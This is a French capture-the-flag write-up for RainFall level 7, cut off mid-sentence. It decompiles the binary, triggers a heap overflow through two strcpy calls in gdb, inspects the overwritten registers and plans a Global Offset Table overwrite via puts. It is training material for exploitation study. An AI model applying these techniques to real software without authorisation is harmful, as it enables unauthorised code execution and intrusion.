# Level7

```
level7@RainFall:~$ ./level7
^CSegmentation fault (core dumped)
level7@RainFall:~$ ./level7 coucou
^CSegmentation fault (core dumped)
level7@RainFall:~$ ./level7 coucou coucou
~~
level7@RainFall:~$ ./level7 coucou coucou coucou
~~
```
Ce nouveau programme prend en parametre les arguments donnés au programme.

Décompilons avec ghidra.
```
void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
{
  time_t tVar1;

  tVar1 = time((time_t *)0x0);
  printf("%s - %d\n",c,tVar1);
  return;
}

undefined4 main(undefined4 param_1,int param_2)
{
  undefined4 *puVar1;
  void *pvVar2;
  undefined4 *puVar3;
  FILE *__stream;

  puVar1 = (undefined4 *)malloc(8);
  *puVar1 = 1;
  pvVar2 = malloc(8);
  puVar1[1] = pvVar2;
  puVar3 = (undefined4 *)malloc(8);
  *puVar3 = 2;
  pvVar2 = malloc(8);
  puVar3[1] = pvVar2;
  strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
  strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
  __stream = fopen("/home/user/level8/.pass","r");
  fgets(c,0x44,__stream);
  puts("~~");
  return 0;
}
```

Une fonction "m" n'est pas appelée par le programme main. Celui-ci stock les adresses des arguments passés sur le tas avec la fonction strcpy. Nous allons exploiter un overflow sur cette fonction.
Commençons par vérifier a quel endroit de la mémoire nous pouvons écraser l'adresse de retour.

```
(gdb) run <<< $(python -c 'print("A" * 50)') $(python -c 'print("A" * 50)')
Starting program: /home/user/level7/level7 <<< $(python -c 'print("A" * 50)') $(python -c 'print("A" * 50)')

Program received signal SIGSEGV, Segmentation fault.
0xb7eb8aa8 in ?? () from /lib/i386-linux-gnu/libc.so.6
```
Nous n'avons pas écrasé l'adresse de retour avec notre buffer overflow.

En revanche lorsqu'on inspecte les registres :
```
(gdb) info registers
eax            0x41414141	1094795585
ecx            0x0	0
edx            0x41414141	1094795585
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff6dc	0xbffff6dc
ebp            0xbffff708	0xbffff708
esi            0x0	0
edi            0x0	0
eip            0xb7eb8aa8	0xb7eb8aa8
eflags         0x200286	[ PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```
Nous avons écrasés les valeurs de eax et edx.
En inspectant la fonction puts utilisée après:
```
0x080485f7 <+214>:	call   0x8048400 <puts@plt>

(gdb) x/i 0x08048400
   0x8048400 <puts@plt>:	jmp    *0x8049928
```
Après s'etre suffisament documenté, nous savons que le programme stocke l'appel de chaque fonction dans la GOT (Global Offset Table) ce qui permet au prochains appels de cette fonction, de ne pas aller chercher a chaque fois dans la bibliotèque standart C.

Nous allons donc avec 
